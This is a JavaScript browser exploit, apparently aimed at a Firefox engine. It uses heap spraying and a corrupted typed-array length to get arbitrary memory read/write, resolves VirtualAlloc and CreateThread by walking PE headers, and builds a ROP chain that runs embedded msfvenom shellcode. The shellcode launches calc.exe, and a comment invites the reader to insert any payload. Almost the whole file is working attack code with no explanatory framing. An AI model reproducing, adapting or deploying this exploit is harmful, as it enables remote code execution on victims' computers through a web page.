var window = self;

  function Memory(b,a,f) 
  { 
      this._base_addr=b; 
      this._read=a; 
      this._write=f; 
      this._abs_read = function(a) { 
          a >= this._base_addr ? a = this._read( a - this._base_addr) : ( a = 4294967295 - this._base_addr + 1 + a, a = this._read(a) );
          return 0>a?4294967295+a+1:a
          
      };
      this._abs_write = function(a,b) {
          a >= this._base_addr ? this._write(a - this._base_addr, b) : ( a = 4294967295 - this._base_addr + 1 + a, this._write(a,b) )
      };
      this.readByte = function(a) { 
          return this.read(a) & 255
          
      };
      this.readWord = function(a) {
          return this.read(a) & 65535
      };
      this.readDword = function(a){ return this.read(a) };
      this.read = function(a,b) { 
          if (a%4) {
              var c = this._abs_read( a & 4294967292),
                  d = this._abs_read( a+4 & 4294967292),
                  e = a%4;
              return c>>>8*e | d<<8*(4-e)
          }
          return this._abs_read(a)
      };
      this.readStr = function(a) { 
          for(var b = "", c = 0;;) {
              if (32 == c)
                  return "";
              var d = this.readByte(a+c);
              if(0 == d)
                  break;
              b += String.fromCharCode(d);
              c++
          }
          return b
          
      };
      this.write = function(a){}
  }

  function PE(b,a) { 
      this.mem = b;
      this.export_table = this.module_base = void 0;
      this.export_table_size = 0;
      this.import_table = void 0;
      this.import_table_size = 0;
      this.find_module_base = function(a) { 
          for(a &= 4294901760; a; ) { 
              if(0x5a4d == this.mem.readWord(a))
                  return this.module_base=a;
              a -= 65536
          }
      };
      this._resolve_pe_structures = function() { 
          peFile = this.module_base + this.mem.readWord(this.module_base+60);
          if(0x4550 != this.mem.readDword(peFile))
              throw "Bad NT Signature";

          this.pe_file = peFile;
          this.optional_header = this.pe_file+36;
          this.export_directory = this.module_base+this.mem.readDword(this.pe_file+120);
          this.export_directory_size = this.mem.readDword(this.pe_file+124);
          this.import_directory=this.module_base+this.mem.readDword(this.pe_file+128);
          this.import_directory_size=this.mem.readDword(this.pe_file+132)};
          this.resolve_imported_function=function(a,b){
              void 0==this.import_directory&&this._resolve_pe_structures();
              for(var e=this.import_directory,c=e+this.import_directory_size;e<c;){
                  var d=this.mem.readStr(this.mem.readDword(e+12)+this.module_base);
                  if(a.toUpperCase()==d.toUpperCase()){
                      for(var c = this.mem.readDword(e) + this.module_base,
                              e = this.mem.readDword(e+16) + this.module_base, 
                              d = this.mem.readDword(c), 
                              f = 0 ; 0 !=d ; )
                      {
                          if(this.mem.readStr(d+this.module_base+2).toUpperCase() == b.toUpperCase())
                              return this.mem.readDword(e+4*f);
                          f++;
                          d = this.mem.readDword(c+4*f)
                      }
                      break
                  }
                  e+=20
              }
              return 0
          };
          void 0!=a && this.find_module_base(a)
      }

    function ROP(mem,a){
       this.mem = mem;
       this.pe = new PE(mem,a);
       this.pe._resolve_pe_structures();
       this.module_base = this.pe.module_base + 0x1000;
       
       this.findSequence = function(seq) { 
          for(var b=0;;) { 
              for(var e=0,c=0;c<seq.length;c++)
                  if(this.mem.readByte(this.module_base+b+c)==seq[c]&&e==c)
                      e++;
                  else 
                      break;
              if(e==seq.length)
                  return this.module_base+b;
              b++
            
       }
        
   };
   this.findStackPivot=function() {
       return this.findSequence([0x94, 0xc3])
      
   };
   this.findPopRet=function(a) { 
       return this.findSequence([0x58, 0xc3])
      
   };
   this.ropChain=function(base, vtOffset, array = undefined) { 
       var buf = undefined
       if (array != undefined)
        buf = array
      else
        buf = new ArrayBuffer(0x1000)
       ropBuff = new Uint32Array(buf);
       var stackPivot = this.findStackPivot(),
           popRet = this.findPopRet("EAX"),
           virtualAllocAddr = this.pe.resolve_imported_function("kernel32.dll","VirtualAlloc");

       ropBuff[0]= popRet+1;
       ropBuff[1]= popRet;
       ropBuff[2]= base+vtOffset+4;
       ropBuff[3]= stackPivot;
       ropBuff[vtOffset>>2] = stackPivot;

       offset = (vtOffset+4>>2);
       ropBuff[offset++]=virtualAllocAddr;
       ropBuff[offset++]=base+(vtOffset+0x1c);
       ropBuff[offset++]=base;
       ropBuff[offset++]=0x1000;
       ropBuff[offset++]=0x1000;
       ropBuff[offset++]=0x40;
       ropBuff[offset++]=0xcccccccc;
       
       return ropBuff;
   }
}

var conv=new ArrayBuffer(8)
var convf64=new Float64Array(conv)
var convu32=new Uint32Array(conv)

var qword2Double=function(b,a) { 
  convu32[0]=b;
  convu32[1]=a;
  return convf64[0]
}

var doubleFromFloat = function(b,a) { 
  convf64[0]=b;
  return convu32[a]
}

var sprayArrays=function() {
  var mArray = new Array(0x1fffe)  
  var arrBuf = new ArrayBuffer(0x100000);
  var dwArray =  new Uint32Array(arrBuf)
  var qwArray = new Float64Array(arrBuf, 0x10)


  for (var i = 0; i < 0x1fffe; i++)
    mArray[i] = qword2Double(0, 0);
  
   mArray[2]     = qword2Double(arrBase + 0xaf0, 0)
   mArray[0xe]   = qword2Double(arrBase +  0x08, 0)
   mArray[0x15]  = qword2Double(0, 0x02)
   mArray[0x21]  = qword2Double(0x02, 0)
   mArray[0x22]  = qword2Double(arrBase + 0x2f0, arrBase + 0x1f0)
   mArray[0x3e]  = qword2Double(0, arrBase + 0x3f0)
   mArray[0x5e]  = qword2Double(arrBase + 0x4f0, 0)
   mArray[0x80]  = qword2Double(0x02, 0)
   mArray[0x9f]  = qword2Double(arrBase + 0x500,0)
   mArray[0xa0]  = qword2Double(0, 0xf0000000)
   mArray[0xa2]  = qword2Double(0, 0xbff00000)
   mArray[0xa4]  = qword2Double(0x02, 0)
   mArray[0xa5]  = qword2Double(0x01, 0)
   mArray[0xaa]  = qword2Double(0, arrBase + 0x5f0)
   mArray[0xac]  = qword2Double(arrBase + 0x6f0, arrBase + 0x700)
   mArray[0xb3]  = qword2Double(0, 0x02)
   mArray[0xb4]  = qword2Double(0, 0)
   mArray[0xde]  = qword2Double(arrBase + 0x7f0, 0)
   mArray[0xfe]  = qword2Double(0x01, 0);
   mArray[0xff]  = qword2Double(0, 0x10000000)
   mArray[0x15e] = qword2Double(0x07, 0)
   mArray[0x15f] = qword2Double(arrBase + 0xf0, arrBase - 0x10 + 0x05)
   mArray[0x160] = qword2Double(arrBase - 0x07, arrBase - 0x10 + 0x0d)
   mArray[0x161] = qword2Double(arrBase + 0x10000b, arrBase + 0x100007)
   mArray[0x162] = qword2Double(arrBase + 0x100003, 0)
   mArray[0x202] = qword2Double(arrBase + 0x1af0, 0)
   mArray[0x20e] = qword2Double(arrBase + 0x1008, 0)
   mArray[0x215] = qword2Double(0, 0x02)
   mArray[0x221] = qword2Double(0x02, 0)
   mArray[0x222] = qword2Double(arrBase + 0x12f0, arrBase + 0x11f0)
   mArray[0x23e] = qword2Double(0, arrBase + 0x13f0)
   mArray[0x25e] = qword2Double(arrBase + 0x14f0, 0)
   mArray[0x280] = qword2Double(0x02, 0)
   mArray[0x29f] = qword2Double(arrBase + 0x1500,0)
   mArray[0x2a0] = qword2Double(0, 0xf0000000)
   mArray[0x2a2] = qword2Double(0, 0xbff00000)
   mArray[0x2a4] = qword2Double(0x02, 0)
   mArray[0x2a5] = qword2Double(0x01, 0)
   mArray[0x2aa] = qword2Double(0, arrBase + 0x15f0)
   mArray[0x2ac] = qword2Double(arrBase + 0x16f0, arrBase + 0x1700)
   mArray[0x2b3] = qword2Double(0, 0x02)
   mArray[0x2b4] = qword2Double(0, 0x00)
   mArray[0x2de] = qword2Double(arrBase + 0x17f0, 0)
   mArray[0x2fe] = qword2Double(0x01, 0)
   mArray[0x2ff] = qword2Double(0, 0x10000000)

  var i = mArray.length;
  while(i--) {qwArray[i] = mArray[i];}

  for (var i = 0; i < spr.length; i += 2)
  {
    spr[i] = mArray.slice(0)
    spr[i + 1] = arrBuf.slice(0)
  }
}

var spr = new Array(400)
var arrBase = 0x22100010;

// Insert your payload here
// msfvenom -p windows/exec cmd=calc.exe -f js_le -e generic/none
Shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100")
if (Shellcode.length % 2 != 0)
  Shellcode += "é‚";

sprayArrays();
postMessage(arrBase)


var len = spr[0].length;
var mArray = undefined;
var dwArray = undefined;
var qwArray = undefined;
var container = undefined;

while (mArray == undefined)
{
  for (var i = 0; i < spr.length; i += 2)
  {
    if (spr[i].length != len)
    {
      container = dwArray = new Uint32Array(spr[i + 1])
      qwArray = new Float64Array(spr[i + 1], 0x10)
      if (dwArray[1] == 0)
      {
        dwArray = new Uint32Array(spr[i - 1])
        dwArray[0] = dwArray[1] = dwArray[2] = dwArray[3] = 0xdea110c8;
        qwArray = new Float64Array(spr[i - 1], 0x10)
      }
      mArray = spr[i];
      break;
    }
  }
}

var off = 0x100000;
if (dwArray != container)
  off = off * 2;

var memory = new Uint32Array(0x10);
var len = memory.length;
mArray[0x20000] = memory;
ropArrBuf = new ArrayBuffer(0x1000)
mArray[0x20001] = ropArrBuf;
ropArrBufPtr = container[0x6]

targetAddr = container[4] + 0x1b;
var arrayBase = container[4] + 0x30;

mArray[0x20000] = undefined;
mArray[0x20001] = undefined;

var n = 0x40;
qwArray[0x35e] = mArray[0x35e] = qword2Double(n + 1, 0)
qwArray[0x35f] = mArray[0x35f] = qword2Double(arrBase - 0x10 + 0x1100, targetAddr)
for (var i = 0; i < (n/2); i++)
  qwArray[0x360 + i] = mArray[0x360 + i] = qword2Double(targetAddr, targetAddr)

container[0] = container[1] = container[2] = container[3] = 0xffffff81;
qwArray[0x1e] = mArray[0x1e] = qword2Double(0xdea110c8, 0)
qwArray[0xfe] = mArray[0xfe] = qword2Double(2, 0)
qwArray[0xb3] = mArray[0xb3] = qword2Double(0, 3)
qwArray[0xa9] = mArray[0xa9] = qword2Double(0, 2)

while (memory.length == len) {}


var mem = new Memory(arrayBase, 
                    function(b) { return memory[b/4]; }, 
                    function(b,a) { memory[b/4] = a;  });

var ptr = targetAddr - 0x1b;
var xulPtr = mem.readDword(ptr + 0xc);
var rop = new ROP(mem, xulPtr);
var ropBase = mem.readDword(ropArrBufPtr + 0x10);
rop.ropChain(ropBase, 0x130, ropArrBuf);
var backupESP = rop.findSequence(Array(0x89, 0x01, 0xc3))
var ropChain = new Uint32Array(ropArrBuf)
ropChain[0] = backupESP;
CreateThread = rop.pe.resolve_imported_function('KERNEL32.dll', 'CreateThread')

ropChain[0x12c >> 2] = ropChain[0x130 >> 2];

for (var i = 0; i < ropChain.length; i++)
{
  if (ropChain[i] == 0xcccccccc)
    break;
}

ropChain[i++] = 0xc4819090;
ropChain[i++] = 0x00000800;
ropChain[i++] = 0x5050c031;
ropChain[i++] = 0x5b21eb50;
ropChain[i++] = 0xb8505053;
ropChain[i++] = CreateThread;
ropChain[i++] = 0xb890d0ff;
ropChain[i++] = arrBase + 0x2040;
ropChain[i++] = 0x5f58208b;
ropChain[i++] = 0xbe905d58;
ropChain[i++] = 0xFFFFFF00;
ropChain[i++] = 0x000cc2c9;
ropChain[i++] = 0xffffdae8;
ropChain[i++] = 0x909090ff;

for (var j = 0; j < Shellcode.length; j += 2)
  ropChain[i++] = Shellcode.charCodeAt(j) + Shellcode.charCodeAt(j + 1) * 0x10000;

mArray[0x400] = qwArray[0x400] = qword2Double(arrBase + 0x2000, 0)
mArray[0x400 + (0x10 >> 3)] = qwArray[0x400 + (0x10 >> 3)] = qword2Double(0, arrBase + 0x2040)
mArray[0x400 + (0x18 >> 3)] = qwArray[0x400 + (0x18 >> 3)] = qword2Double(4, 0)
mArray[0x400 + (0x40 >> 3)] = qwArray[0x400 + (0x40 >> 3)] = qword2Double(ropBase, 0)
mArray[0x400 + (0xac >> 3)] = qwArray[0x400 + (0xac >> 3)] = qword2Double(0, 2)

for (var i = 0; i < 4; i++) {
  container[0x400 + i] = 0xdea110c8
}

qwArray[0x21e] = mArray[0x21e] = qword2Double(0xdea110c8, 0)
qwArray[0x2fe] = mArray[0x2fe] = qword2Double(2, 0)
qwArray[0x2b3] = mArray[0x2b3] = qword2Double(0, 3)
qwArray[0x2a9] = mArray[0x2a9] = qword2Double(0, 2)

postMessage("!")
